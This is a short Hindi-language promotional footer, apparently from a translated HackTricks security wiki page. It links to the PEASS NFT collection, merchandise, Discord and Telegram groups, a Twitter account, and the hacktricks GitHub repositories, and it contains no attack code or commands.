* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** **अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
